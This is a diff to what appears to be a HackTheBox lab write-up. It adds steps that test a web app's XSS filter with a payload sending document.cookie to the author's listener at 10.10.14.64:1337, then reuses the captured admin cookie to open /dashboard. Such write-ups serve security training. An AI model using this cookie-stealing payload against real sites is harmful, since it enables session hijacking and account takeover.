@@ -151,6 +151,42 @@ Got 2 results:
 
 9. Seems we still got the warning.
 10. Another interest to identify XSS vuln is to test the request header. The most common headers that is injectable with XSS are `referer` and `user-agent`.
-11. Let's try to manipulate the `user-agent` field by dropping the fetch cookie payload there.
+11. But before testing that, let's try to test for the last time whether:
+
+```
+- It just gave us a warning message everytime it detects <script> tag usage or html entities, and still execute the code but not alert.
+- Or it really does block the execution of any XSS payload.
+```
+
+12. Let's try to manipulate the message with not URL encoded XSS payload, for the last check I drop the simple cookie stealing payload.
+
+```js
+<img src=err onerror=fetch('http://10.10.14.64:1337/'+document.cookie);>
+```
+
+13. Boot up a python server on port 1337 then send the request.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d4724e8f-244a-41ae-997e-331e65fb5123)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/13b00aad-4507-4445-bd41-6fbf1f45aedc)
+
+
+14. We got the admin cookie! As you can see, the cookie value is different than ours, hence it's really is the admin.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/765b04d7-6daf-4c37-9e04-8e66f987339f)
+
+
+15. Change the cookie value to the admin cookie then access `/dashboard` endpoint.
+
+> It is accessible now.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3e2a4d4a-7f8d-4c6f-a787-328585792cf5)
+
+
+16. Great!
+
 
  
